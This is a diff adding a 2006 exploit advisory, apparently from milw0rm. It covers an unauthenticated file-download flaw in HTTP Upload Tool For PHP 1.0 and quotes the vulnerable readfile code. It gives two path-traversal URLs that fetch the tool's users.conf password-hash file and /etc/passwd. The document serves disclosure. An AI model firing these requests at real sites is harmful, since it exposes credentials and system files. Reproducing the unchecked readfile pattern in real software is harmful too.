@@ -1,0 +1,36 @@
+#######################################################################################
+# Target:
+#
+#       HTTP Upload Tool For PHP 1.0
+#       http://uploadtool.sourceforge.net/
+#
+# Vulnerability:
+#
+#       Information disclosure
+#
+# Description:
+#
+#       The download.php file in Upload Tool for PHP neither verifies that a
+#       requestor has authenticated, nor performs any sanity checking on the file
+#       being requested. This allows an unauthenticated user to download any file
+#       which the web server has read rights to, including the users.conf file which
+#       contains a list of Upload Tool's users and their hashed passwords.
+#
+# Vulnerable Code (truncated):
+#
+#       $filename = $_GET['filename'];
+#       readfile("$filename");
+#
+# Exploit:
+#
+#       http://www.examplesite.com/upload/bin/download.php?filename=../conf/users.conf
+#       http://www.examplesite.com/upload/bin/download.php?filename=/etc/passwd
+#
+# Discovered:
+#
+#       Craig Heffner
+#       heffnercj [at] gmail.com
+#       http://www.craigheffner.com
+#######################################################################################
+
+# milw0rm.com [2006-11-16]
